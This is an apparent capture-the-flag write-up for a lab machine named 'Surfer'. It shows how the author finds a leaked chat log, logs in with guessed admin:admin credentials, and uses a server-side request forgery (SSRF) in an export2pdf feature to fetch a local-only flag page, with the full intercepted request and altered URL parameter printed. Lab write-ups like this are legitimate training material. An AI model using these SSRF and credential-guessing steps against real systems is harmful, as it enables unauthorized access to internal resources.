# Surfer

First access to the website, we see a login page that required username and password. Using `dirsearch` to scan the website, we see a link that seem suspicious: `http://<IP_ADDRESS>/backup/chat.txt`

Open this link, we see a conversation:

> Admin: I have finished setting up the new export2pdf tool.&#x20;
>
> Kate: Thanks, we will require daily system reports in pdf format.&#x20;
>
> Admin: Yes, I am updated about that.&#x20;
>
> Kate: Have you finished adding the internal server.&#x20;
>
> Admin: Yes, it should be serving flag from now.&#x20;
>
> Kate: Also Don't forget to change the creds, plz stop using your username as password.&#x20;
>
> Kate: Hello.. ?

From that, we can see that the username and password to login is `admin`-`admin`.

On the dashboard site, we see something seem like a flag’s location:

<figure><img src="../.gitbook/assets/Untitled" alt=""><figcaption></figcaption></figure>

So, the flag is in `http://<IP_ADDRESS>/internal/admin.php`. But when we try to access it directly, it shows an error that this link is only locally accessible.

Also, we see that this website has a tool named `export2pdf`. Burp Suite catches the request when we call this function:

```php
POST /export2pdf.php HTTP/1.1
Host: 10.10.0.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://10.10.0.101
Connection: close
Referer: http://10.10.0.101/index.php
Cookie: PHPSESSID=eff13cc079f8ee6f55a48c20c79d9815
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

Basically, when the function is called, it accesses a local URL (`127.0.0.1/...`) that has the server info. So, maybe this website has a [SSRF](https://portswigger.net/web-security/ssrf) vulnerability? Call the function again, but change the URL to `http%3A%2F%2F127.0.0.1%2Finternal%2Fadmin.php`, we get the PDF file that contains the flag:

<figure><img src="../.gitbook/assets/Untitled 1" alt=""><figcaption></figcaption></figure>
